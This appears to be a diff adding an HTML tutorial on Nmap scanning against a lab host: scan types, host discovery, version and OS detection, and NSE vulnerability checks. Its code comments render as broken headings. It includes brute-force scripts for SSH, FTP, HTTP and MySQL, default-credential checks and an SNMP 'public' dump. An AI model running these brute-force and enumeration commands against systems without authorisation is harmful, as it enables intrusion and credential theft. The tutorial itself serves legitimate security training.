+  <pre><code># Kali Linux / Debian / Ubuntu:
+sudo apt install nmap -y
+<h1 id="centos-rhel-fedora" tabindex="-1">CentOS / RHEL / Fedora: <a class="direct-link" href="#centos-rhel-fedora" aria-hidden="true">#</a></h1>
+<p>sudo yum install nmap -y</p>
+<h1 id="macos-with-homebrew" tabindex="-1">macOS (with Homebrew): <a class="direct-link" href="#macos-with-homebrew" aria-hidden="true">#</a></h1>
+<p>brew install nmap</p>
+<h1 id="windows" tabindex="-1">Windows: <a class="direct-link" href="#windows" aria-hidden="true">#</a></h1>
+<h1 id="download-installer-from-https-nmap-org-download-html" tabindex="-1">Download installer from: <a href="https://nmap.org/download.html">https://nmap.org/download.html</a> <a class="direct-link" href="#download-installer-from-https-nmap-org-download-html" aria-hidden="true">#</a></h1>
+<h1 id="verify-installation" tabindex="-1">Verify installation: <a class="direct-link" href="#verify-installation" aria-hidden="true">#</a></h1>
+<p>nmap --version</p>
+<h1 id="expected-nmap-7-x-x-https-nmap-org" tabindex="-1">Expected: Nmap 7.x.x ( <a href="https://nmap.org">https://nmap.org</a> )</code></pre> <a class="direct-link" href="#expected-nmap-7-x-x-https-nmap-org" aria-hidden="true">#</a></h1>
+</div>
+<h2 id="basic-scan-types" tabindex="-1">Basic Scan Types <a class="direct-link" href="#basic-scan-types" aria-hidden="true">#</a></h2>
+<p>Nmap has multiple scan techniques. Each sends different types of packets and is suited to different situations. Understanding why each works — not just how to run it — is what separates a professional from someone who just copies commands.</p>
+<h3 id="syn-scan-the-default-and-most-common" tabindex="-1">SYN Scan — The Default &amp; Most Common <a class="direct-link" href="#syn-scan-the-default-and-most-common" aria-hidden="true">#</a></h3>
+<p>The SYN scan (also called a &quot;stealth scan&quot; or &quot;half-open scan&quot;) is Nmap's default when run as root. It sends a SYN packet — the first step of a TCP handshake — and waits for the response. It never completes the full handshake, which means it's faster and less likely to be logged than a full TCP connection.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">SYN Scan</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># SYN scan (requires root/sudo):
+sudo nmap -sS 192.168.56.102
+<h1 id="what-each-response-means" tabindex="-1">What each response means: <a class="direct-link" href="#what-each-response-means" aria-hidden="true">#</a></h1>
+<h1 id="syn-ack-received-port-is-open" tabindex="-1">SYN-ACK received → port is OPEN <a class="direct-link" href="#syn-ack-received-port-is-open" aria-hidden="true">#</a></h1>
+<h1 id="rst-received-port-is-closed" tabindex="-1">RST received     → port is CLOSED <a class="direct-link" href="#rst-received-port-is-closed" aria-hidden="true">#</a></h1>
+<h1 id="no-response-port-is-filtered-firewall-dropping-packets" tabindex="-1">No response      → port is FILTERED (firewall dropping packets) <a class="direct-link" href="#no-response-port-is-filtered-firewall-dropping-packets" aria-hidden="true">#</a></h1>
+<h1 id="icmp-unreachable-port-is-filtered" tabindex="-1">ICMP unreachable → port is FILTERED <a class="direct-link" href="#icmp-unreachable-port-is-filtered" aria-hidden="true">#</a></h1>
+<h1 id="example-output" tabindex="-1">Example output: <a class="direct-link" href="#example-output" aria-hidden="true">#</a></h1>
+<h1 id="port-state-service" tabindex="-1">PORT    STATE SERVICE <a class="direct-link" href="#port-state-service" aria-hidden="true">#</a></h1>
+<h1 id="22-tcp-open-ssh" tabindex="-1">22/tcp  open  ssh <a class="direct-link" href="#22-tcp-open-ssh" aria-hidden="true">#</a></h1>
+<h1 id="80-tcp-open-http" tabindex="-1">80/tcp  open  http <a class="direct-link" href="#80-tcp-open-http" aria-hidden="true">#</a></h1>
+<h1 id="443-tcp-closed-https" tabindex="-1">443/tcp closed https</code></pre> <a class="direct-link" href="#443-tcp-closed-https" aria-hidden="true">#</a></h1>
+</div>
+<h3 id="udp-scan" tabindex="-1">UDP Scan <a class="direct-link" href="#udp-scan" aria-hidden="true">#</a></h3>
+<p>UDP scanning is slower and less reliable than TCP scanning because UDP is connectionless — there's no handshake. But many critical services run on UDP: DNS (53), DHCP (67/68), SNMP (161), and NTP (123). Never skip UDP in a real engagement.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">UDP Scan</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># UDP scan (slow — be patient):
+sudo nmap -sU 192.168.56.102
+<h1 id="scan-only-most-common-udp-ports-faster" tabindex="-1">Scan only most common UDP ports (faster): <a class="direct-link" href="#scan-only-most-common-udp-ports-faster" aria-hidden="true">#</a></h1>
+<p>sudo nmap -sU --top-ports 100 192.168.56.102</p>
+<h1 id="combine-udp-tcp-syn-scan" tabindex="-1">Combine UDP + TCP SYN scan: <a class="direct-link" href="#combine-udp-tcp-syn-scan" aria-hidden="true">#</a></h1>
+<p>sudo nmap -sS -sU -p T:80,443,22,U:53,161,67 192.168.56.102</p>
+<h1 id="common-udp-ports-to-always-check" tabindex="-1">Common UDP ports to always check: <a class="direct-link" href="#common-udp-ports-to-always-check" aria-hidden="true">#</a></h1>
+<h1 id="53-dns" tabindex="-1">53   = DNS <a class="direct-link" href="#53-dns" aria-hidden="true">#</a></h1>
+<h1 id="67-dhcp" tabindex="-1">67   = DHCP <a class="direct-link" href="#67-dhcp" aria-hidden="true">#</a></h1>
+<h1 id="69-tftp" tabindex="-1">69   = TFTP <a class="direct-link" href="#69-tftp" aria-hidden="true">#</a></h1>
+<h1 id="123-ntp" tabindex="-1">123  = NTP <a class="direct-link" href="#123-ntp" aria-hidden="true">#</a></h1>
+<h1 id="161-snmp-often-misconfigured-dumps-full-system-info" tabindex="-1">161  = SNMP (often misconfigured, dumps full system info) <a class="direct-link" href="#161-snmp-often-misconfigured-dumps-full-system-info" aria-hidden="true">#</a></h1>
+<h1 id="500-ike-ipsec-vpn" tabindex="-1">500  = IKE/IPsec VPN</code></pre> <a class="direct-link" href="#500-ike-ipsec-vpn" aria-hidden="true">#</a></h1>
+</div>
+<div class="callout callout-info">
+  <i class="fa-solid fa-circle-info" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">SNMP on Port 161</div>
+    <div class="callout-body">If UDP port 161 is open, always follow up with: <code>snmpwalk -c public -v1 TARGET_IP</code> — SNMP with the default "public" community string can dump the entire system MIB including running processes, network interfaces, installed software, and user accounts.</div>
+  </div>
+</div>
+<h3 id="tcp-connect-scan" tabindex="-1">TCP Connect Scan <a class="direct-link" href="#tcp-connect-scan" aria-hidden="true">#</a></h3>
+<p>When you don't have root/sudo privileges, Nmap falls back to a TCP Connect scan. It completes the full three-way handshake, making it more detectable but usable without elevated privileges.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">TCP Connect Scan (no root needed)</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># TCP Connect scan (no sudo required):
+nmap -sT 192.168.56.102
+<h1 id="when-to-use-st" tabindex="-1">When to use -sT: <a class="direct-link" href="#when-to-use-st" aria-hidden="true">#</a></h1>
+<h1 id="you-dont-have-root-sudo" tabindex="-1">- You don't have root/sudo <a class="direct-link" href="#you-dont-have-root-sudo" aria-hidden="true">#</a></h1>
+<h1 id="scanning-through-proxies-syn-scan-doesnt-work-through-proxies" tabindex="-1">- Scanning through proxies (SYN scan doesn't work through proxies) <a class="direct-link" href="#scanning-through-proxies-syn-scan-doesnt-work-through-proxies" aria-hidden="true">#</a></h1>
+<h1 id="when-you-need-reliable-open-closed-results" tabindex="-1">- When you need reliable open/closed results</code></pre> <a class="direct-link" href="#when-you-need-reliable-open-closed-results" aria-hidden="true">#</a></h1>
+</div>
+<h2 id="host-discovery-finding-live-hosts" tabindex="-1">Host Discovery — Finding Live Hosts <a class="direct-link" href="#host-discovery-finding-live-hosts" aria-hidden="true">#</a></h2>
+<p>Before scanning ports, you need to know which hosts are alive. Nmap's host discovery phase sends probes to figure out who is online without scanning every port.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Host Discovery</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># Ping sweep — find alive hosts in a subnet:
+nmap -sn 192.168.56.0/24
+# Output: Hosts that responded, their MACs and vendor names
+<h1 id="faster-with-fping" tabindex="-1">Faster with fping: <a class="direct-link" href="#faster-with-fping" aria-hidden="true">#</a></h1>
+<p>fping -a -g 192.168.56.0/24 2&gt;/dev/null</p>
+<h1 id="disable-ping-scan-even-if-host-blocks-icmp" tabindex="-1">Disable ping (scan even if host blocks ICMP): <a class="direct-link" href="#disable-ping-scan-even-if-host-blocks-icmp" aria-hidden="true">#</a></h1>
+<p>nmap -Pn 192.168.56.102</p>
+<h1 id="use-when-firewall-blocks-ping-but-ports-may-still-be-open" tabindex="-1">Use when: firewall blocks ping but ports may still be open <a class="direct-link" href="#use-when-firewall-blocks-ping-but-ports-may-still-be-open" aria-hidden="true">#</a></h1>
+<h1 id="arp-scan-most-reliable-on-local-network" tabindex="-1">ARP scan (most reliable on local network): <a class="direct-link" href="#arp-scan-most-reliable-on-local-network" aria-hidden="true">#</a></h1>
+<p>sudo nmap -PR 192.168.56.0/24</p>
+<h1 id="tcp-syn-ping-on-specific-ports" tabindex="-1">TCP SYN ping on specific ports: <a class="direct-link" href="#tcp-syn-ping-on-specific-ports" aria-hidden="true">#</a></h1>
+<p>nmap -PS80,443,22 192.168.56.0/24</p>
+<h1 id="multiple-hosts-scan-a-list-from-a-file" tabindex="-1">Multiple hosts — scan a list from a file: <a class="direct-link" href="#multiple-hosts-scan-a-list-from-a-file" aria-hidden="true">#</a></h1>
+<p>nmap -sn -iL targets.txt</p>
+<h1 id="exclude-specific-hosts" tabindex="-1">Exclude specific hosts: <a class="direct-link" href="#exclude-specific-hosts" aria-hidden="true">#</a></h1>
+<p>nmap -sn 192.168.56.0/24 --exclude 192.168.56.1</code></pre></p>
+</div>
+<h2 id="port-selection" tabindex="-1">Port Selection <a class="direct-link" href="#port-selection" aria-hidden="true">#</a></h2>
+<p>By default Nmap scans the top 1000 most common ports. That misses a lot. Here's how to control exactly which ports get scanned.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Port Selection Options</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># Default: top 1000 ports
+nmap 192.168.56.102
+<h1 id="specific-ports" tabindex="-1">Specific ports: <a class="direct-link" href="#specific-ports" aria-hidden="true">#</a></h1>
+<p>nmap -p 22,80,443,3306,8080 192.168.56.102</p>
+<h1 id="port-range" tabindex="-1">Port range: <a class="direct-link" href="#port-range" aria-hidden="true">#</a></h1>
+<p>nmap -p 1-1024 192.168.56.102</p>
+<h1 id="all-65535-ports-thorough-takes-longer" tabindex="-1">ALL 65535 ports (thorough — takes longer): <a class="direct-link" href="#all-65535-ports-thorough-takes-longer" aria-hidden="true">#</a></h1>
+<p>nmap -p- 192.168.56.102</p>
+<h1 id="all-ports-with-speed-boost" tabindex="-1">All ports with speed boost: <a class="direct-link" href="#all-ports-with-speed-boost" aria-hidden="true">#</a></h1>
+<p>nmap -p- --min-rate 5000 192.168.56.102</p>
+<h1 id="top-n-most-common-ports" tabindex="-1">Top N most common ports: <a class="direct-link" href="#top-n-most-common-ports" aria-hidden="true">#</a></h1>
+<p>nmap --top-ports 100 192.168.56.102<br>
+nmap --top-ports 500 192.168.56.102</p>
+<h1 id="fast-scan-top-100-ports-only" tabindex="-1">Fast scan (top 100 ports only): <a class="direct-link" href="#fast-scan-top-100-ports-only" aria-hidden="true">#</a></h1>
+<p>nmap -F 192.168.56.102</p>
+<h1 id="specific-protocol-prefix" tabindex="-1">Specific protocol prefix: <a class="direct-link" href="#specific-protocol-prefix" aria-hidden="true">#</a></h1>
+<p>nmap -p T:80,443,U:53,161 192.168.56.102</p>
+<h1 id="t-tcp-u-udp" tabindex="-1">T: = TCP,  U: = UDP</code></pre> <a class="direct-link" href="#t-tcp-u-udp" aria-hidden="true">#</a></h1>
+</div>
+<div class="callout callout-info">
+  <i class="fa-solid fa-circle-info" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Professional Workflow: Two-Phase Scanning</div>
+    <div class="callout-body">In real engagements, run a fast all-port scan first to find open ports, then run a deep scan on only those ports. This is faster and more thorough than one slow full scan.</div>
+  </div>
+</div>
+<h2 id="service-and-version-detection" tabindex="-1">Service &amp; Version Detection <a class="direct-link" href="#service-and-version-detection" aria-hidden="true">#</a></h2>
+<p>Finding open ports is just the beginning. <code>-sV</code> tells you what software is running on each port and — critically — what version. This is how you find exploitable vulnerabilities: an outdated Apache, an ancient OpenSSH, a vulnerable vsftpd.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Service & Version Detection</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># Service version detection:
+nmap -sV 192.168.56.102
+<h1 id="sample-output" tabindex="-1">Sample output: <a class="direct-link" href="#sample-output" aria-hidden="true">#</a></h1>
+<h1 id="port-state-service-version" tabindex="-1">PORT     STATE SERVICE  VERSION <a class="direct-link" href="#port-state-service-version" aria-hidden="true">#</a></h1>
+<h1 id="21-tcp-open-ftp-vsftpd-2-3-4-vulnerable-cve-2011-2523" tabindex="-1">21/tcp   open  ftp      vsftpd 2.3.4        ← VULNERABLE (CVE-2011-2523) <a class="direct-link" href="#21-tcp-open-ftp-vsftpd-2-3-4-vulnerable-cve-2011-2523" aria-hidden="true">#</a></h1>
+<h1 id="22-tcp-open-ssh-openssh-4-7p1-very-old" tabindex="-1">22/tcp   open  ssh      OpenSSH 4.7p1       ← Very old <a class="direct-link" href="#22-tcp-open-ssh-openssh-4-7p1-very-old" aria-hidden="true">#</a></h1>
+<h1 id="80-tcp-open-http-apache-httpd-2-2-8-very-old" tabindex="-1">80/tcp   open  http     Apache httpd 2.2.8  ← Very old <a class="direct-link" href="#80-tcp-open-http-apache-httpd-2-2-8-very-old" aria-hidden="true">#</a></h1>
+<h1 id="3306-tcp-open-mysql-mysql-5-0-51a-very-old" tabindex="-1">3306/tcp open  mysql    MySQL 5.0.51a       ← Very old <a class="direct-link" href="#3306-tcp-open-mysql-mysql-5-0-51a-very-old" aria-hidden="true">#</a></h1>
+<h1 id="5432-tcp-open-postgres-postgresql-8-3-0-very-old" tabindex="-1">5432/tcp open  postgres PostgreSQL 8.3.0    ← Very old <a class="direct-link" href="#5432-tcp-open-postgres-postgresql-8-3-0-very-old" aria-hidden="true">#</a></h1>
+<h1 id="intensity-levels-0-9-default-is-7" tabindex="-1">Intensity levels (0-9, default is 7): <a class="direct-link" href="#intensity-levels-0-9-default-is-7" aria-hidden="true">#</a></h1>
+<p>nmap -sV --version-intensity 9 192.168.56.102  # Most thorough<br>
+nmap -sV --version-intensity 0 192.168.56.102  # Lightest (version banner only)</p>
+<h1 id="version-light-faster-less-accurate" tabindex="-1">Version light (faster, less accurate): <a class="direct-link" href="#version-light-faster-less-accurate" aria-hidden="true">#</a></h1>
+<p>nmap -sV --version-light 192.168.56.102</p>
+<h1 id="version-all-try-every-probe" tabindex="-1">Version all (try every probe): <a class="direct-link" href="#version-all-try-every-probe" aria-hidden="true">#</a></h1>
+<p>nmap -sV --version-all 192.168.56.102</code></pre></p>
+</div>
+<h2 id="os-detection" tabindex="-1">OS Detection <a class="direct-link" href="#os-detection" aria-hidden="true">#</a></h2>
+<p>Nmap can fingerprint the operating system by analysing how it responds to specially crafted packets. OS detection is useful for understanding the target environment and narrowing down which exploits may apply.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">OS Detection</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># OS detection (requires root):
+sudo nmap -O 192.168.56.102
+<h1 id="sample-output-1" tabindex="-1">Sample output: <a class="direct-link" href="#sample-output-1" aria-hidden="true">#</a></h1>
+<h1 id="running-linux-2-6-x" tabindex="-1">Running: Linux 2.6.X <a class="direct-link" href="#running-linux-2-6-x" aria-hidden="true">#</a></h1>
+<h1 id="os-cpe-cpe-o-linux-linux-kernel-2-6" tabindex="-1">OS CPE: cpe:/o:linux:linux_kernel:2.6 <a class="direct-link" href="#os-cpe-cpe-o-linux-linux-kernel-2-6" aria-hidden="true">#</a></h1>
+<h1 id="os-details-linux-2-6-9-2-6-33" tabindex="-1">OS details: Linux 2.6.9 - 2.6.33 <a class="direct-link" href="#os-details-linux-2-6-9-2-6-33" aria-hidden="true">#</a></h1>
+<h1 id="aggressive-os-detection-tries-harder" tabindex="-1">Aggressive OS detection (tries harder): <a class="direct-link" href="#aggressive-os-detection-tries-harder" aria-hidden="true">#</a></h1>
+<p>sudo nmap -O --osscan-guess 192.168.56.102</p>
+<h1 id="limit-os-detection-to-promising-targets" tabindex="-1">Limit OS detection to promising targets: <a class="direct-link" href="#limit-os-detection-to-promising-targets" aria-hidden="true">#</a></h1>
+<p>sudo nmap -O --osscan-limit 192.168.56.102</p>
+<h1 id="combined-service-os-detection" tabindex="-1">Combined service + OS detection: <a class="direct-link" href="#combined-service-os-detection" aria-hidden="true">#</a></h1>
+<p>sudo nmap -sV -O 192.168.56.102</code></pre></p>
+</div>
+<h2 id="nse-scripts-nmaps-secret-weapon" tabindex="-1">NSE Scripts — Nmap's Secret Weapon <a class="direct-link" href="#nse-scripts-nmaps-secret-weapon" aria-hidden="true">#</a></h2>
+<p>The Nmap Scripting Engine (NSE) is what elevates Nmap from a port scanner to a full reconnaissance and vulnerability assessment platform. NSE scripts are written in Lua and can automate virtually any network interaction — from grabbing banners to detecting specific CVEs.<br>
+Scripts are stored in <code>/usr/share/nmap/scripts/</code> on Kali Linux. There are over 600 built-in scripts.</p>
+<h3 id="default-scripts-sc" tabindex="-1">Default Scripts (-sC) <a class="direct-link" href="#default-scripts-sc" aria-hidden="true">#</a></h3>
+<p>The <code>-sC</code> flag runs the default script set — scripts that are safe, fast, and provide high-value information. Always use it.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Default Scripts</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># Run default scripts:
+nmap -sC 192.168.56.102
+<h1 id="default-scripts-automatically-check-things-like" tabindex="-1">Default scripts automatically check things like: <a class="direct-link" href="#default-scripts-automatically-check-things-like" aria-hidden="true">#</a></h1>
+<h1 id="ssh-host-keys-and-algorithms" tabindex="-1">- SSH host keys and algorithms <a class="direct-link" href="#ssh-host-keys-and-algorithms" aria-hidden="true">#</a></h1>
+<h1 id="http-server-headers-and-title" tabindex="-1">- HTTP server headers and title <a class="direct-link" href="#http-server-headers-and-title" aria-hidden="true">#</a></h1>
+<h1 id="ftp-anonymous-login-allowed" tabindex="-1">- FTP anonymous login allowed? <a class="direct-link" href="#ftp-anonymous-login-allowed" aria-hidden="true">#</a></h1>
+<h1 id="ssl-certificate-details" tabindex="-1">- SSL certificate details <a class="direct-link" href="#ssl-certificate-details" aria-hidden="true">#</a></h1>
+<h1 id="smb-shares-and-os-information" tabindex="-1">- SMB shares and OS information <a class="direct-link" href="#smb-shares-and-os-information" aria-hidden="true">#</a></h1>
+<h1 id="dns-zone-transfer-attempts" tabindex="-1">- DNS zone transfer attempts <a class="direct-link" href="#dns-zone-transfer-attempts" aria-hidden="true">#</a></h1>
+<h1 id="default-credentials-on-common-services" tabindex="-1">- Default credentials on common services <a class="direct-link" href="#default-credentials-on-common-services" aria-hidden="true">#</a></h1>
+<h1 id="combined-with-version-detection-use-this-always" tabindex="-1">Combined with version detection (use this always): <a class="direct-link" href="#combined-with-version-detection-use-this-always" aria-hidden="true">#</a></h1>
+<p>nmap -sV -sC 192.168.56.102</p>
+<h1 id="sample-sc-output-for-ftp-port-21" tabindex="-1">Sample -sC output for FTP port 21: <a class="direct-link" href="#sample-sc-output-for-ftp-port-21" aria-hidden="true">#</a></h1>
+<h1 id="port-state-service-1" tabindex="-1">PORT   STATE SERVICE <a class="direct-link" href="#port-state-service-1" aria-hidden="true">#</a></h1>
+<h1 id="21-tcp-open-ftp" tabindex="-1">21/tcp open  ftp <a class="direct-link" href="#21-tcp-open-ftp" aria-hidden="true">#</a></h1>
+<h1 id="ftp-anon-anonymous-ftp-login-allowed-ftp-code-230" tabindex="-1">| ftp-anon: Anonymous FTP login allowed (FTP code 230) <a class="direct-link" href="#ftp-anon-anonymous-ftp-login-allowed-ftp-code-230" aria-hidden="true">#</a></h1>
+<h1 id="drwxr-xr-x-2-0-65534-4096-mar-17-2010-pub" tabindex="-1">|_drwxr-xr-x  2 0  65534  4096 Mar 17  2010 pub <a class="direct-link" href="#drwxr-xr-x-2-0-65534-4096-mar-17-2010-pub" aria-hidden="true">#</a></h1>
+<h1 id="ftp-syst" tabindex="-1">| ftp-syst: <a class="direct-link" href="#ftp-syst" aria-hidden="true">#</a></h1>
+<h1 id="stat" tabindex="-1">|   STAT: <a class="direct-link" href="#stat" aria-hidden="true">#</a></h1>
+<h1 id="ftp-server-status" tabindex="-1">| FTP server status: <a class="direct-link" href="#ftp-server-status" aria-hidden="true">#</a></h1>
+<h1 id="connected-to-192-168-56-101" tabindex="-1">|      Connected to 192.168.56.101</code></pre> <a class="direct-link" href="#connected-to-192-168-56-101" aria-hidden="true">#</a></h1>
+</div>
+<h3 id="vulnerability-detection-scripts" tabindex="-1">Vulnerability Detection Scripts <a class="direct-link" href="#vulnerability-detection-scripts" aria-hidden="true">#</a></h3>
+<p>The <code>vuln</code> category runs scripts that check for specific known vulnerabilities. This is powerful but can be noisy — use it carefully on production systems and only with permission.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Vulnerability Scripts</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># Run ALL vulnerability scripts:
+sudo nmap --script vuln 192.168.56.102
+<h1 id="check-specifically-for-eternalblue-ms17-010" tabindex="-1">Check specifically for EternalBlue (MS17-010): <a class="direct-link" href="#check-specifically-for-eternalblue-ms17-010" aria-hidden="true">#</a></h1>
+<p>nmap --script smb-vuln-ms17-010 -p 445 192.168.56.102</p>
+<h1 id="output-if-vulnerable" tabindex="-1">Output if vulnerable: <a class="direct-link" href="#output-if-vulnerable" aria-hidden="true">#</a></h1>
+<h1 id="smb-vuln-ms17-010" tabindex="-1">| smb-vuln-ms17-010: <a class="direct-link" href="#smb-vuln-ms17-010" aria-hidden="true">#</a></h1>
+<h1 id="vulnerable" tabindex="-1">|   VULNERABLE: <a class="direct-link" href="#vulnerable" aria-hidden="true">#</a></h1>
+<h1 id="remote-code-execution-vulnerability-in-microsoft-smbv1" tabindex="-1">|   Remote Code Execution vulnerability in Microsoft SMBv1 <a class="direct-link" href="#remote-code-execution-vulnerability-in-microsoft-smbv1" aria-hidden="true">#</a></h1>
+<h1 id="state-vulnerable" tabindex="-1">|     State: VULNERABLE <a class="direct-link" href="#state-vulnerable" aria-hidden="true">#</a></h1>
+<h1 id="ids-cve-cve-2017-0143" tabindex="-1">|     IDs:  CVE:CVE-2017-0143 <a class="direct-link" href="#ids-cve-cve-2017-0143" aria-hidden="true">#</a></h1>
+<h1 id="check-for-heartbleed-openssl" tabindex="-1">Check for Heartbleed (OpenSSL): <a class="direct-link" href="#check-for-heartbleed-openssl" aria-hidden="true">#</a></h1>
+<p>nmap --script ssl-heartbleed -p 443 192.168.56.102</p>
+<h1 id="check-for-shellshock" tabindex="-1">Check for ShellShock: <a class="direct-link" href="#check-for-shellshock" aria-hidden="true">#</a></h1>
+<p>nmap --script http-shellshock --script-args uri=/cgi-bin/test.cgi -p 80 192.168.56.102</p>
+<h1 id="check-for-vsftpd-backdoor-cve-2011-2523" tabindex="-1">Check for vsftpd backdoor (CVE-2011-2523): <a class="direct-link" href="#check-for-vsftpd-backdoor-cve-2011-2523" aria-hidden="true">#</a></h1>
+<p>nmap --script ftp-vsftpd-backdoor -p 21 192.168.56.102</p>
+<h1 id="sql-injection-detection-on-web" tabindex="-1">SQL injection detection on web: <a class="direct-link" href="#sql-injection-detection-on-web" aria-hidden="true">#</a></h1>
+<p>nmap --script http-sql-injection -p 80 192.168.56.102</p>
+<h1 id="smb-vulnerabilities-comprehensive" tabindex="-1">SMB vulnerabilities (comprehensive): <a class="direct-link" href="#smb-vulnerabilities-comprehensive" aria-hidden="true">#</a></h1>
+<p>nmap --script smb-vuln* -p 139,445 192.168.56.102</code></pre></p>
+</div>
+<h3 id="authentication-and-brute-force-scripts" tabindex="-1">Authentication &amp; Brute Force Scripts <a class="direct-link" href="#authentication-and-brute-force-scripts" aria-hidden="true">#</a></h3>
+<p>NSE includes brute force scripts for common services. These try username/password combinations automatically.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Auth & Brute Scripts</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># FTP brute force:
+nmap --script ftp-brute -p 21 192.168.56.102
+<h1 id="ssh-brute-force" tabindex="-1">SSH brute force: <a class="direct-link" href="#ssh-brute-force" aria-hidden="true">#</a></h1>
+<p>nmap --script ssh-brute -p 22 192.168.56.102</p>
+<h1 id="http-basic-auth-brute-force" tabindex="-1">HTTP basic auth brute force: <a class="direct-link" href="#http-basic-auth-brute-force" aria-hidden="true">#</a></h1>
+<p>nmap --script http-brute -p 80 192.168.56.102</p>
+<h1 id="mysql-brute-force" tabindex="-1">MySQL brute force: <a class="direct-link" href="#mysql-brute-force" aria-hidden="true">#</a></h1>
+<p>nmap --script mysql-brute -p 3306 192.168.56.102</p>
+<h1 id="custom-credentials" tabindex="-1">Custom credentials: <a class="direct-link" href="#custom-credentials" aria-hidden="true">#</a></h1>
+<p>nmap --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt -p 22 192.168.56.102</p>
+<h1 id="check-for-default-credentials-on-many-services-at-once" tabindex="-1">Check for default credentials on many services at once: <a class="direct-link" href="#check-for-default-credentials-on-many-services-at-once" aria-hidden="true">#</a></h1>
+<p>nmap --script *-default-accounts 192.168.56.102</p>
+<h1 id="smb-enumeration-users-shares-os" tabindex="-1">SMB enumeration (users, shares, OS): <a class="direct-link" href="#smb-enumeration-users-shares-os" aria-hidden="true">#</a></h1>
+<p>nmap --script smb-enum-users,smb-enum-shares,smb-os-discovery -p 139,445 192.168.56.102</p>
+<h1 id="http-enumeration-directories-methods-headers" tabindex="-1">HTTP enumeration (directories, methods, headers): <a class="direct-link" href="#http-enumeration-directories-methods-headers" aria-hidden="true">#</a></h1>
+<p>nmap --script http-headers,http-methods,http-enum -p 80 192.168.56.102</code></pre></p>
+</div>
+<div class="callout callout-info">
+  <i class="fa-solid fa-circle-info" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Find Scripts by Category or Name</div>
+    <div class="callout-body">List all available scripts: <code>ls /usr/share/nmap/scripts/</code> — Search for scripts: <code>nmap --script-help "ftp*"</code> — Find scripts by category: <code>grep -r "categories" /usr/share/nmap/scripts/ | grep "vuln"</code></div>
+  </div>
+</div>
+<h2 id="output-formats" tabindex="-1">Output Formats <a class="direct-link" href="#output-formats" aria-hidden="true">#</a></h2>
+<p>Always save your Nmap output. You'll want to refer back to it, import it into Metasploit, or include it in your report. Nmap supports multiple output formats.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Output Formats</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># Normal output (human readable):
+nmap -sV 192.168.56.102 -oN scan_normal.txt
+<h1 id="xml-output-machine-readable-importable" tabindex="-1">XML output (machine readable, importable): <a class="direct-link" href="#xml-output-machine-readable-importable" aria-hidden="true">#</a></h1>
+<p>nmap -sV 192.168.56.102 -oX scan_results.xml</p>
+<h1 id="grepable-output-easy-to-parse-with-grep-awk" tabindex="-1">Grepable output (easy to parse with grep/awk): <a class="direct-link" href="#grepable-output-easy-to-parse-with-grep-awk" aria-hidden="true">#</a></h1>
+<p>nmap -sV 192.168.56.102 -oG scan_grepable.txt</p>
+<h1 id="all-formats-at-once-recommended-saves-all-three" tabindex="-1">ALL formats at once (recommended — saves all three): <a class="direct-link" href="#all-formats-at-once-recommended-saves-all-three" aria-hidden="true">#</a></h1>
+<p>nmap -sV -sC -O -p- 192.168.56.102 -oA full_scan</p>
+<h1 id="creates-full-scan-nmap-full-scan-xml-full-scan-gnmap" tabindex="-1">Creates: full_scan.nmap  full_scan.xml  full_scan.gnmap <a class="direct-link" href="#creates-full-scan-nmap-full-scan-xml-full-scan-gnmap" aria-hidden="true">#</a></h1>
+<h1 id="import-xml-into-metasploit" tabindex="-1">Import XML into Metasploit: <a class="direct-link" href="#import-xml-into-metasploit" aria-hidden="true">#</a></h1>
+<h1 id="inside-msfconsole" tabindex="-1">Inside msfconsole: <a class="direct-link" href="#inside-msfconsole" aria-hidden="true">#</a></h1>
+<h1 id="db-import-full-scan-xml" tabindex="-1">db_import full_scan.xml <a class="direct-link" href="#db-import-full-scan-xml" aria-hidden="true">#</a></h1>
+<h1 id="hosts-see-imported-hosts" tabindex="-1">hosts       ← see imported hosts <a class="direct-link" href="#hosts-see-imported-hosts" aria-hidden="true">#</a></h1>
+<h1 id="services-see-imported-services" tabindex="-1">services    ← see imported services <a class="direct-link" href="#services-see-imported-services" aria-hidden="true">#</a></h1>
+<h1 id="parse-grepable-output" tabindex="-1">Parse grepable output: <a class="direct-link" href="#parse-grepable-output" aria-hidden="true">#</a></h1>
+<p>grep &quot;open&quot; scan_grepable.txt<br>
+grep &quot;22/open&quot; scan_grepable.txt</p>
